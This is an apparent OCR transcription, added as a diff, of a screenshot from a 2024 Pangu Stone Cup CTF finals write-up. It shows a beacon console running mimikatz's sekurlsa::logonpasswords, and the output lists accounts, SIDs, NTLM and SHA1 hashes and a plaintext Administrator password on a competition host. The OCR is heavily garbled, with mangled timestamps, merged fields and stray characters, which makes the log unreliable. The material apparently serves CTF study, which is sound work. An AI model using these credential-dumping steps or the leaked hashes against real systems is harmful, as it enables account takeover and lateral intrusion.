@@ -1,0 +1,55 @@
+# OCR: f499aaf18ef3ed6a40272a07a9527e9a.jpg
+# 来源: ./02-WriteUp/2024/2024-盘古石杯-总决赛/f499aaf18ef3ed6a40272a07a9527e9a.jpg
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 生成: 2026-11-03 15:18
+
+e5/22e7:43:15uTc[input1<neo>logonpasswords
+e5/2207-43:15UTc[tasklT1003,T1o55,T1093>Taskedbeacontorunmimikatz's sekurlsa::logonpasswordscommand 05/2207-43:15UTC[checkin]hostcalled home,sent:297594 bytes
+05/2207:43:16UTc[output】 received output:
+0：996（00000000:000003e4
+Authentication Id
+Session
+User Name Domain
+LogonServer Logon Time SID
+MSV: tspkg wdigest
+Username*
+Service from e
+INDEXUSERS CMS
+(nul)
+2024/5/2215-25:32 S-1-5-20
+INDEXUSERS
+*Domain
+CMS
+*Password:(null) kerberos
+Usernameindexusers ★
+*Domain
+CMS
+*Password:(null) ssp
+credman
+AuthenticationId:361309（00000000-0005835d）
+Session UserName Domain
+LogonServer Logon Time SID
+PSV
+Interactivefrom1 Administrator
+INDEXUSER INDEXUSER
+2024/5/2215-25:39
+S-1-5-21-2557184285-116329523-1948284583-506
+[e001o0eelCredentialKeys
+*NTLM ★SHA1
+：32ed87bdb5fdc5e9cba88547376818d4
+6ed5833cf35286ebf8662b7b5949f0d742bbec3f
+[eeoe003]Primary*Username
+Administrator
+光
+Domain
+*NTLM ★SHA1 tspkg wdigest
+Username*
+* Domain*Password kerberos
+INDEXUSER
+32ed87bdb5fdc5e9cba88547376818d4
+6ed5833cf35286ebf8662b7b5949f0d742bbec3f Administrator
+INDEXUSER 123456
+Username*
+*
+Domain
+Administrator INDEXUSER
